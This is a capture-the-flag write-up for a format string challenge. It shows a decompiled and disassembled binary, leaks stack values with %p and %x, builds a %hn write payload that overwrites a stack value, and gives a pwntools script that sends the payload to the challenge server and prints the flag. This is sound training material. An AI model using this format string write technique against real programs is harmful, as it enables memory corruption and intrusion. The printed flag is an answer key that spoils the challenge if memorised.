The goal is to put the value '0x1337beef' into the register before the checking.
Here is the ghidra code:

```c
undefined8 main(void) {
  long in_FS_OFFSET;
  long local_48;
  long *local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_48 = 0x1337babe;
  local_40 = &local_48;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  read(0,&local_38,0x1f);
  printf("\n[!] Checking.. ");
  printf((char *)&local_38);
  if (local_48 == 0x1337beef) {
    delulu();
  }
  else {
    error("ALERT ALERT ALERT ALERT\n");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

We can see our values inside the stack by using format string exploitation:

```bash
Try to deceive it by changing your ID.

>> AAAAAAAAAAAAAAA%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x

[!] Checking.. AAAAAAAAAAAAAAAa02190d006d714887107fffffff1337babea021b1f041414141
```

I didn't know this vuln much, so i've checked multiple websites, including this one:
https://pwn.college/software-exploitation/format-string-exploits

Here is what i tried:

```
>> %p %p %p %p %p %p %p %p %p 

[!] Checking.. 0x7ffc6a486840 (nil) 0x7f752bf14887 0x10 0x7fffffff 0x1337babe 0x7ffc6a488960 0x7025207025207025 0x2520702520702520 

>> %x %x %x %x %x %x %x %x

[!] Checking.. 34a7fba0 0 bcd14887 10 7fffffff 1337babe 34a81cc0 25207825
```

In the video, the value is a char array so %p is different from %x.
In my case, the value is an hex value, so %p is probably meaningless.

I also tried to select only the 1337babe part, and since this is the 6th value, i can use that:
```
>> %6$x

[!] Checking.. 1337babe
```

Using GDB, `disass main` print this:
```
   0x000000000000144a <+0>:     endbr64
   0x000000000000144e <+4>:     push   rbp
   0x000000000000144f <+5>:     mov    rbp,rsp
   0x0000000000001452 <+8>:     sub    rsp,0x40
   0x0000000000001456 <+12>:    mov    rax,QWORD PTR fs:0x28
   0x000000000000145f <+21>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000001463 <+25>:    xor    eax,eax
   0x0000000000001465 <+27>:    mov    QWORD PTR [rbp-0x40],0x1337babe
   0x000000000000146d <+35>:    lea    rax,[rbp-0x40]
   0x0000000000001471 <+39>:    mov    QWORD PTR [rbp-0x38],rax
   0x0000000000001475 <+43>:    mov    QWORD PTR [rbp-0x30],0x0
   0x000000000000147d <+51>:    mov    QWORD PTR [rbp-0x28],0x0
   0x0000000000001485 <+59>:    mov    QWORD PTR [rbp-0x20],0x0
   0x000000000000148d <+67>:    mov    QWORD PTR [rbp-0x18],0x0
   0x0000000000001495 <+75>:    lea    rax,[rbp-0x30]
   0x0000000000001499 <+79>:    mov    edx,0x1f
   0x000000000000149e <+84>:    mov    rsi,rax
   0x00000000000014a1 <+87>:    mov    edi,0x0
   0x00000000000014a6 <+92>:    call   0x1130 <read@plt>
   0x00000000000014ab <+97>:    lea    rax,[rip+0x112a]        # 0x25dc
   0x00000000000014b2 <+104>:   mov    rdi,rax
   0x00000000000014b5 <+107>:   mov    eax,0x0
   0x00000000000014ba <+112>:   call   0x10f0 <printf@plt>
   0x00000000000014bf <+117>:   lea    rax,[rbp-0x30]
   0x00000000000014c3 <+121>:   mov    rdi,rax
   0x00000000000014c6 <+124>:   mov    eax,0x0
   0x00000000000014cb <+129>:   call   0x10f0 <printf@plt>
   0x00000000000014d0 <+134>:   mov    rax,QWORD PTR [rbp-0x40]
   0x00000000000014d4 <+138>:   cmp    rax,0x1337beef
   0x00000000000014da <+144>:   je     0x14ed <main+163>
   0x00000000000014dc <+146>:   lea    rax,[rip+0x110a]        # 0x25ed
   0x00000000000014e3 <+153>:   mov    rdi,rax
   0x00000000000014e6 <+156>:   call   0x1269 <error>
   0x00000000000014eb <+161>:   jmp    0x14f7 <main+173>
   0x00000000000014ed <+163>:   mov    eax,0x0
   0x00000000000014f2 <+168>:   call   0x1332 <delulu>
   0x00000000000014f7 <+173>:   mov    eax,0x0
   0x00000000000014fc <+178>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000001500 <+182>:   sub    rdx,QWORD PTR fs:0x28
   0x0000000000001509 <+191>:   je     0x1510 <main+198>
   0x000000000000150b <+193>:   call   0x10e0 <__stack_chk_fail@plt>
   0x0000000000001510 <+198>:   leave
   0x0000000000001511 <+199>:   ret
```

We are looking for this test:
`  if (local_48 == 0x1337beef) {`
We can see these lines
```
0x00000000000014d0 <+134>:   mov    rax,QWORD PTR [rbp-0x40]
0x00000000000014d4 <+138>:   cmp    rax,0x1337beef
```
What we see here is that rbp-0x40 points to out value that's compared to 0x1337beef.


In all the examples i see, the targeted value has to be outside main function.


Since the program stores the pointer on local_40 after (called local 38 in the Ghidra file), we can do this kind of payload:
```
%p%p%p%p%p%p%hn%p

[!] Checking.. 0x7fffffffbb30(nil)0x7ffff7d148870x100x7fffffff0x1337babe

Breakpoint 2, 0x00005555555554d4 in main ()
*RAX  0x13370039
```

Our format string will look like this:
`%p%p%p%p%p%p%hn%p` --> `0x... 0x... [... 6 pointers] %hn 1337beef variable` !


If i add a space before:
```
 %p%p%p%p%p%p%hn%p

[!] Checking..  0x7fffffffbb30(nil)0x7ffff7d148870x100x7fffffff0x1337babe0x2570257025702520

*RAX  0x1337003a
```

Our format string will look like this:
`[SPACE]%p%p%p%p%p%p%hn%p` --> `[SPACE]0x... 0x... [... 6 pointers] %n 1337beef variable` !

Since length before %n is 1 byte longer, that increases written value to RAX !


Now we just need to use the following payload :
```
%p%p%p%p%p%p%.48822x%7$hn
```
%p 6 times: Get values out of the stack to align with our target address
%.48822x: print 0 48822 times (equivalent of BEEF minus len of our 6 addresses)
%7$hn: Write to the 7th value extracted the len of previous printed elements (BEEF in hex)


The code:
```python
from pwn import *

LOCAL_FILE_PATH: str = "./delulu"
REMOTE_SERVER = "83.136.252.62"
REMOTE_PORT = 30929

def pwn_open_door(proc):
    proc.recvuntil(b">> ")
    #payload = b"%x "*6 + b"%n" + b"%p"
    payload = b"%p"*6 + b"%.48822x%7$hn"
    proc.sendline(payload)
    print(b"trying payload", payload)
    res = proc.recvall(timeout=2)
    print(bytes.decode(res))

def run_remote():
    conn = remote(REMOTE_SERVER, REMOTE_PORT)
    pwn_open_door(conn)

def run_bin_local(process_path: str):
    proc = process([process_path])
    pwn_open_door(proc)

def main():
    #run_bin_local(LOCAL_FILE_PATH)
    run_remote()

if __name__ == '__main__':
    main()
```

And we get the flag:
`HTB{m45t3r_0f_d3c3pt10n}`

